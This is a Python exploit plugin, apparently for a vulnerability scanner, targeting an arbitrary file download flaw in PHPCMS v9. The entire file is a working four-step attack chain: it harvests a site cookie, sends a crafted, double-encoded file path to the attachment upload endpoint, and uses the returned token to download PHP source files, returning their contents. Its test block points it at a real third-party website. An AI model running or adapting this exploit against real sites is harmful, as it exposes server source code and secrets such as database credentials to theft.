#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'


'''

'''
import re

def info(data=None):
    info = {
        "name": "phpcms v9 download",
        "info": "phpcms v9 download",
        "level": "high",
        "type": "download",
    }
    return info


def prove(data):
    data = init(data, 'phpcms')
    if data['base_url']:
        headers = {"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/534.4 (KHTML, like Gecko) Chrome/6.0.481.0 Safari/534.4"}
        for path in ["", "phpcms/"]:
            url1 = data['base_url'] + path +"index.php?m=wap&c=index&a=init&siteid=1"
            res1 = curl('get',url1,headers = headers)
            if res1 !=None:
                for cookie in res1.cookies:
                    if '_siteid' in cookie.name:
                        userid = cookie.value

                        url2 = data['base_url'] + path +"index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=pad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26s%3Dindex%26f%3D.p%25253chp"
                        _data1 = {'userid_flash': userid}
                        res2 = curl('post', url=url2, data=_data1,headers = headers)
                        if res2 != None:
                            for cookie in res2.cookies:
                                if '_att_json' in cookie.name:
                                    att_json = cookie.value

                                    url3 = data['base_url'] + path +"index.php?m=content&c=down&a=init&a_k=" + att_json
                                    res3 =  curl('get', url3,headers = headers)

                                    if res3 !=None:
                                        file = re.findall(r'<a href="(.+?)"', res3.text)[0]
                                        url4 =  data['base_url'] + path + 'index.php' + file
                                        res4 = curl('get', url4,headers = headers)
                                        if res4 !=None:
                                            if  '<?php' in res4.text:
                                                data['flag'] = 1
                                                data['data'].append({"url": url4})
                                                data['res'].append({"info": url1, "key": "phpcms v9 download",'connect':res4.text})
                                                return data
    return data

if __name__=='__main__':
    from script import init, curl
    print(prove({'url':'http://www.baidu.com','flag':-1,'data':[],'res':[]}))